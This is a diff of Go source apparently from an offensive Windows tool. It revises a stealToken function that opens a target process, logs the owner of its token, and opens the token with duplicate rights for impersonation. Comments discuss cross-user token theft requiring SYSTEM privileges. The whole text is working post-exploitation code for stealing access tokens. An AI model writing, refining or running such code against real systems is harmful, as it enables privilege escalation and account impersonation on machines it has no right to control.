@@ -206,35 +206,36 @@ func stealToken(pid uint32) (string, error) {
 	defer windows.CloseHandle(hProcess)
 	debugLog.WriteString("[DEBUG] OpenProcess succeeded\n")
 
-	// Open process token - use TOKEN_IMPERSONATE instead of TOKEN_ASSIGN_PRIMARY for non-SYSTEM contexts
-	// TOKEN_ASSIGN_PRIMARY requires SYSTEM-level access
-	debugLog.WriteString("[DEBUG] Calling OpenProcessToken...\n")
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] Requested access: TOKEN_DUPLICATE(0x%x) | TOKEN_IMPERSONATE(0x%x) | TOKEN_QUERY(0x%x)\n", 
-		windows.TOKEN_DUPLICATE, windows.TOKEN_IMPERSONATE, windows.TOKEN_QUERY))
-	
+	// First, get token info to see who owns the target process
+	debugLog.WriteString("[DEBUG] Getting target process token info...\n")
+	var queryToken windows.Token
+	err = windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &queryToken)
+	if err == nil {
+		tokenUser, err := queryToken.GetTokenUser()
+		if err == nil {
+			targetUsername, targetDomain, _, _ := tokenUser.User.Sid.LookupAccount("")
+			debugLog.WriteString(fmt.Sprintf("[DEBUG] Target process owner: %s\\%s\n", targetDomain, targetUsername))
+		}
+		queryToken.Close()
+	}
+
+	// Open process token - try TOKEN_DUPLICATE first (most restrictive)
+	debugLog.WriteString("[DEBUG] Calling OpenProcessToken with TOKEN_DUPLICATE|TOKEN_QUERY...\n")
 	var primaryToken windows.Token
 	err = windows.OpenProcessToken(
 		hProcess,
-		windows.TOKEN_DUPLICATE|windows.TOKEN_IMPERSONATE|windows.TOKEN_QUERY,
+		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY,
 		&primaryToken,
 	)
 	if err != nil {
-		// Get more detailed error information
-		lastErr := windows.GetLastError()
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenProcessToken failed with error: %v (LastError: 0x%x)\n", err, lastErr))
+		debugLog.WriteString(fmt.Sprintf("[DEBUG] TOKEN_DUPLICATE|TOKEN_QUERY failed: %v\n", err))
 		
-		// Try with just TOKEN_QUERY to see if that works
-		debugLog.WriteString("[DEBUG] Attempting OpenProcessToken with just TOKEN_QUERY...\n")
-		var testToken windows.Token
-		err2 := windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &testToken)
-		if err2 == nil {
-			testToken.Close()
-			debugLog.WriteString("[DEBUG] TOKEN_QUERY alone succeeded - privilege issue with TOKEN_DUPLICATE/TOKEN_ASSIGN_PRIMARY\n")
-		} else {
-			debugLog.WriteString(fmt.Sprintf("[DEBUG] TOKEN_QUERY alone also failed: %v\n", err2))
-		}
+		// Cross-user token theft requires SYSTEM privileges
+		// Try to provide helpful error message
+		debugLog.WriteString("[DEBUG] Cross-user token theft typically requires SYSTEM privileges\n")
+		debugLog.WriteString("[DEBUG] Current user is setup (admin), target may be different user\n")
 		
-		return debugLog.String() + output, fmt.Errorf("OpenProcessToken failed: %v", err)
+		return debugLog.String() + output, fmt.Errorf("OpenProcessToken failed: %v (cross-user token theft requires SYSTEM privileges)", err)
 	}
 	defer primaryToken.Close()
 	debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenProcessToken succeeded, token: 0x%x\n", primaryToken))
